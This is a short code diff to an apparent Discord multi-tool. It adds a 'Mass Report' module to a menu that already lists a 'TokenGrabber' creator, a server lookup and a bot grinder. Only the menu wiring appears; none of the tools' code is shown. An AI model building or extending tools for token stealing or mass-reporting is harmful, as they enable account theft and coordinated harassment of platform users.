@@ -11,6 +11,7 @@ import modules.tokenGrabber as grabber
 import modules.credits as credits
 import modules.dankMemer as memer
 import modules.serverLookup as serverLookup
+import modules.massReport as massReport
 
 r = fg(241) # Setup color variables
 r2 = fg(255)
@@ -31,8 +32,9 @@ class Client:
             "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
             "8" : {"function" : memer.start, "name" : "Dank memer gridner"},
             "9" : {"function" : serverLookup.start, "name" : "Server Lookup"},
-            "10" : {"function" : credits.show_credits, "name" : "Credits"},
-            "11" : {"function" : exit, "name" : "Exit"}
+            "10" : {"function" : massReport.start, "name" : "Mass Report"},
+            "11" : {"function" : credits.show_credits, "name" : "Credits"},
+            "12" : {"function" : exit, "name" : "Exit"}
         }
         self.modules = modules
 
